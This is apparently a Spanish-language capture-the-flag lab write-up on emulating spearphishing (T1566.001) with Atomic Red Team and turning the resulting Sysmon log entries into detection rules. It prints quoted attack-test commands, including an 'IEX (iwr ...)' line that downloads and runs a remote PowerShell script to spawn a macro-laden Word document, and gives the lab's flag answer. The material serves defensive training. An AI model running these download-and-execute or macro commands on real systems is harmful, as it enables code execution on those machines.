Nuestro equipo de SOC se esta acercando y tenemos que preparar el evneto

Nos comentan que el Glith ha hecho algun preparativo sobre firewall, parcheando vulnerabilidades etc, pero se han detectado anomalias. Logueos de administrador, escalas de privilegios, etc.

# Objetivos de aprendizaje

- Aprender como identificar tecnicas maliciosas usando MITRE ATT&CK
- Aprender a usar Atomic Red Team y simulaciones de ataque
- Entender como crear alertar y reglas de deteccion

# Detección de erorres

En un mundo utopico pues el blue team detectaría uno y cada ataque recibido pero eso es casi imposible.

- La seguridad es como el gato y el ratón
- La linea entre algo anomalo y que sea realmente significante es muuuuuuuuuuy fina

# Ciber atacantes y matar al rey

Como blue teamer, deberemos prevenir dichos ataques y empezar por el principio de la colina. Deberemos entender las fases, reconocimiento, compromiso, etc..

Si somos capaces de detectar dichos movimientos nos ganaremos mucho por eso mismo esta MITRE ATT&CK

# MITRE ATT&CK

Es un framework muy popular para entender diferentes técnicas y tacticas que los actores hacen para llegar hasta el final de un objetivo. Colección de tacticas, tecnicas y procedimientos para implementar dichos actores.

![image](https://github.com/user-attachments/assets/75c7cdeb-c5d1-4650-9b21-fdfd1796ea98)

# Atomic Read

Esto es una librear de colleción para RED TEAM testea casos de MITRE: La libreria consiste en simplemente testear y ejecutar cada test del blue team y ayudar. Dicha libreria esta automatizada, para las tecnicas o podemos ejecutarla manualmente.

# Dropping the Atomic

McSkidy tiene la gran idea de que pasaria con una "máquina comprometida" y alguien intentara usar Atomic Red Team  para emular los sistemas sin permisos. 

# Ejecutar Atomic

McSkidy sospecha que el atacante usa la tecnica  T1566.001 Spearphishing vamos a emular dicho ataque suponiendo del lado del ataque

Abriremos PowerShel como administrador y empezaremos con el comando de ayuda del programa primero entraremos

```
Get-Help Invoke-Atomictest
```

```
Get-Help Invoke-Atomictest
NAME
    Invoke-AtomicTest

SYNTAX
    Invoke-AtomicTest [-AtomicTechnique] <string[]> [-ShowDetails] [-ShowDetailsBrief] [-TestNumbers <string[]>] 
    [-TestNames <string[]>] [-TestGuids <string[]>] [-PathToAtomicsFolder <string>] [-CheckPrereqs]
    [-PromptForInputArgs] [-GetPrereqs] [-Cleanup] [-NoExecutionLog] [-ExecutionLogPath <string>] [-Force] [-InputArgs<hashtable>] [-TimeoutSeconds <int>] [-Session <PSSession[]>] [-Interactive] [-KeepStdOutStdErrFiles]
    [-LoggingModule <string>] [-WhatIf] [-Confirm]  [<CommonParameters>]

ALIASES
    None

REMARKS
    None
```

Como vemos la ayuda solo nos enseña parametros disponibles sin explicación.

![image](https://github.com/user-attachments/assets/41136c8a-09a0-4f5b-b15b-3dfef9adf501)

## Primer comando

Vamos a construir el primer comando y conocer los parametros disponibles. Sabemos que la técnica utilizada es la anterior, Para coger la información deberemos incluid la técnica utilizada y añadir la flag

```
-ShowDetails
```

Entonces el comando quedaría tal que así

```
Invoke-AtomicTest T1566.001 -ShowDetails
```

```
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Download Macro-Enabled Phishing Attachment
Atomic Test Number: 1
Atomic Test GUID: 114ccff9-ae6d-4547-9ead-4cd69f687306
Description: This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating
an end user clicking a phishing link to download the file. The file "PhishingAttachment.xlsm" is downloaded to the %temp
% directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$url = 'http://localhost/PhishingAttachment.xlsm'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm

Cleanup Commands:
Command:
Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Word spawned a command shell and used an IP address in the command line
Atomic Test Number: 2
Atomic Test GUID: cbb6799a-425c-4f83-9194-5447a909d67f
Description: Word spawning a command prompt then running a command with an IP address in the command line is an indiciat
or of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]
```

El output

![image](https://github.com/user-attachments/assets/857594ca-998e-45cb-a145-649aa68e9e90)

Vamos a continuar y posteriormente ejecutar nuestro primer test. Antes de ejecutar la emulacion, deberemos tener todos los recursos necesarios. Podemos verificar agregando 

```
-Checkprereq
```

```
Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq
```

```
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1566.001-1 Download Macro-Enabled Phishing Attachment
Prerequisites met: T1566.001-1 Download Macro-Enabled Phishing Attachment
```

Una vez verificadas las dependencias. Vamos a continuar con la emulación. Deberemos ejecutar el siguiente comando para empezar la emulación

```
Invoke-AtomicTest T1566.001 -TestNumbers 1
```

```
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
Done executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
```

# Detectar el Atomic

Una vez ejecutado Atomic, podemos ver los logs entris simulando dicho ataque. Para este proposito deberemos usar los Logs de evenetos de windows. Sysmon (System Monitor) dando información sobre un proceso, conexiones de red, y cambios del archivo.

Para hacer todo esto mas fácil vamos a crear un evento para esta emulación, primero limpiaremos los archivos del test anterior

```
Invoke-AtomicTest T1566.001 -TestNumbers 1 -cleanup
```

![image](https://github.com/user-attachments/assets/dffb7717-0705-4597-865a-904b9cb98b9a)

(Event Viewer)

Una vez todo limpio podemos de nuevo ejecutar la emulación de ataque

```
Invoke-AtomicTest T1566.001 -TestNumbers 1
```

Una veez mandado nos volveremos al "Event Viewer" y refrescaremos. Cogemos los datos de primero a ultimo y vemos a ver que ha pasado

```
"powershell.exe" & {$url = 'http://localhost/PhishingAttachment.xlsm' $url2 = 'http://localhost/PhishingAttachment.txt' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm Invoke-WebRequest -Uri $url2 -OutFile $env:TEMP\PhishingAttachment.txt}
```

Vaya vaya encontramos pora quí una URL y el código utilizado

Vamonos al directorio que nos dice

```
 C:\Users\ADMINI~1\AppData\Local\Temp\
```

Aquí encontramos la primera flag dentro de PhishingAtachment.txt

Vamos a voler a lanzar un -cleanup

```
Invoke-AtomicTest T1566.001-1 -cleanup
```

# Alertar a Atomic

En el anterior frase, encontramos multiples indicadores de compromiso. Vamos a usar esta información para crear reglas de detección que incluyan EDR, SIEM, IDS y etc. Estas herramientas tienen muchas funciones como crear o importar reglas. 

Vamos a centrarnos en lo anterio

```
"powershell.exe" & {$url = 'http://localhost/PhishingAttachment.xlsm' Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}"
```

Reglas por ejemplo en Sigma

- Invoke-WebRequest
- $url = 'http://localhost/PhishingAttachment.xlsm'
- PhishingAttachment.xlsm

La parte de detección es efectiva. Nosotros limpiamos los artefactos para descubrir durante test de emulación. Podemos importar 

# Reto

Glich continua a preparar el SOC y decide fortificar la seguridad, decide simular el ataque con un ramsomware. El esta seguro de la deteccion implementada y te dice que ele ayudes. Nuestra tarea es identificar un test atomico correcto y ver ventaja del comando y script integrado.


# Preguntas

Cual es la flag fel archivo .txt que esta en el mismo directorio que PishingAttachment.xslm

```
THM{GlitchTestingForSpearphishing}
```




